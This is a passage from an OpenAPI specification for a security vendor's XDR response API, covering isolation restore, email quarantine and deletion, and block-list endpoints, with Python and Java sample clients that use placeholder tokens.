            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/restoreIsolate'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'computerId': 'YOUR_COMPUTERID (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/restoreIsolate\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"computerId\\\": \\\"YOUR_COMPUTERID (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/quarantineMessage": {
      "post": {
        "summary": "Quarantine email message",
        "description": "Moves a message from a mailbox to the quarantine folder\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Quarantine/Restore messages</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "messageId",
                  "mailBox",
                  "messageDeliveryTime"
                ],
                "properties": {
                  "messageId": {
                    "description": "email message id",
                    "type": "string",
                    "example": "cb9c8412-1f64-4fa0-a36b-76bf41a07ede"
                  },
                  "mailBox": {
                    "description": "email message's mailbox",
                    "type": "string",
                    "example": "someone@example.com"
                  },
                  "messageDeliveryTime": {
                    "description": "email message's delivery time",
                    "type": "string",
                    "example": "2020-05-15T20:42:50.323Z"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sca",
                    "default": "sca"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "quarantine info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "Access Denied",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "Not Found",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Not Found",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Email"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/quarantineMessage'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'messageId': 'YOUR_MESSAGEID (string)',\n    'mailBox': 'YOUR_MAILBOX (string)',\n    'messageDeliveryTime': 'YOUR_MESSAGEDELIVERYTIME (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/quarantineMessage\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"messageId\\\": \\\"YOUR_MESSAGEID (string)\\\",\" +\n                \"    \\\"mailBox\\\": \\\"YOUR_MAILBOX (string)\\\",\" +\n                \"    \\\"messageDeliveryTime\\\": \\\"YOUR_MESSAGEDELIVERYTIME (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/deleteMessage": {
      "post": {
        "summary": "Delete email message",
        "description": "Deletes a message from a mailbox\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Delete messages</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "messageId",
                  "mailBox",
                  "messageDeliveryTime"
                ],
                "properties": {
                  "messageId": {
                    "description": "email message id",
                    "type": "string",
                    "example": "cb9c8412-1f64-4fa0-a36b-76bf41a07ede"
                  },
                  "mailBox": {
                    "description": "email message's mailbox",
                    "type": "string",
                    "example": "someone@example.com"
                  },
                  "messageDeliveryTime": {
                    "description": "email message's delivery time",
                    "type": "string",
                    "example": "2020-05-15T20:42:50.323Z"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sca",
                    "default": "sca"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "delete message info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Email"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/deleteMessage'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'messageId': 'YOUR_MESSAGEID (string)',\n    'mailBox': 'YOUR_MAILBOX (string)',\n    'messageDeliveryTime': 'YOUR_MESSAGEDELIVERYTIME (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/deleteMessage\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"messageId\\\": \\\"YOUR_MESSAGEID (string)\\\",\" +\n                \"    \\\"mailBox\\\": \\\"YOUR_MAILBOX (string)\\\",\" +\n                \"    \\\"messageDeliveryTime\\\": \\\"YOUR_MESSAGEDELIVERYTIME (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/block": {
      "post": {
        "summary": "Add to block list",
        "description": "Adds a file SHA-1, IP address, domain, or URL object to the User-Defined Suspicious Objects List, which blocks the objects on subsequent detections\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Add to block list</li>\n  </ul>\n  <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "valueType",
                  "targetValue"
                ],
                "properties": {
                  "valueType": {
                    "description": "block item value type",
                    "type": "string",
                    "enum": [
                      "file_sha1",
                      "ip",
                      "domain",
                      "url",
                      "mailbox"
                    ],
                    "example": "file_sha1"
                  },
                  "targetValue": {
                    "description": "item value info",
                    "type": "string",
                    "example": "2de5c1125d5f991842727ed8ea8b5fda0ffa249b"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sao"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "block info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "PartialContent"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "task duplicated"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "bad argument",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Bad argument",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "BadArgument"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Product not connected"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "Unauthorized",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Unauthorized",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "Unauthorized"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "The token expires"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "PermissionDeny",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "enum": [
                            "PermissionDeny"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "Role denied"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "404": {
            "description": "NotFound",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "NotFound",
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "enum": [
                            "NotFound"
                          ]
                        },
                        "message": {
                          "type": "string",
                          "example": "Not found"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "internal error",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "description": "Internal error",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "description": "task error info",
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
                          "example": "InternalError"
                        },
                        "message": {
                          "type": "string",
                          "description": "detail error message",
                          "example": "DB error."
                        }
                      }
                    },
                    "actionId": {
                      "description": "action id",
                      "example": 88139521,
                      "type": "string"
                    }
                  }
                }
              }
            }
          }
        },
        "tags": [
          "Common"
        ],
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/response/block'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'valueType': 'YOUR_VALUETYPE (string)',\n    'targetValue': 'YOUR_TARGETVALUE (string)',\n    'productId': 'YOUR_PRODUCTID (string)',\n    'description': 'YOUR_DESCRIPTION (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/response/block\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"valueType\\\": \\\"YOUR_VALUETYPE (string)\\\",\" +\n                \"    \\\"targetValue\\\": \\\"YOUR_TARGETVALUE (string)\\\",\" +\n                \"    \\\"productId\\\": \\\"YOUR_PRODUCTID (string)\\\",\" +\n                \"    \\\"description\\\": \\\"YOUR_DESCRIPTION (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/response/restoreBlock": {
      "post": {
        "summary": "Remove from block list",
        "description": "Removes a file SHA-1, IP address, domain, or URL object that was added to the User-Defined Suspicious Objects List using the \"Add to block list\" action\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Response Management</b><br>\n  <ul>\n    <li>View, filter, and search (Task List tab)</li>\n    <li>Add to block list</li>\n  </ul>\n  <b>Suspicious Object Management</b><br>\n  <ul>\n    <li>View, filter, and search</li>\n    <li>Manage lists and configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "type": "object",
                "required": [
                  "valueType",
                  "targetValue"
                ],
                "properties": {
                  "valueType": {
                    "description": "block item value type",
                    "type": "string",
                    "enum": [
                      "file_sha1",
                      "ip",
                      "domain",
                      "url",
                      "mailbox"
                    ],
                    "example": "file_sha1"
                  },
                  "targetValue": {
                    "description": "item value info",
                    "type": "string",
                    "example": "2de5c1125d5f991842727ed8ea8b5fda0ffa249b"
                  },
                  "productId": {
                    "description": "target product",
                    "type": "string",
                    "example": "sao"
                  },
                  "description": {
                    "description": "action description",
                    "type": "string",
                    "example": "block info"
                  }
                }
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "OK",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "actionId",
                    "taskStatus"
                  ],
                  "properties": {
                    "actionId": {
                      "description": "8 digit group id to identify action",
                      "example": 88139521,
                      "type": "string"
                    },
                    "taskStatus": {
                      "description": "task status",
                      "type": "string",
                      "example": "pending",
                      "enum": [
                        "pending"
                      ]
                    }
                  }
                }
              }
            }
          },
          "206": {
            "description": "duplicate action",
            "content": {
              "application/json": {
                "schema": {
                  "type": "object",
                  "required": [
                    "error"
                  ],
                  "properties": {
                    "error": {
                      "type": "object",
                      "required": [
                        "code",
                        "message"
                      ],
                      "properties": {
                        "code": {
                          "type": "string",
                          "description": "error class",
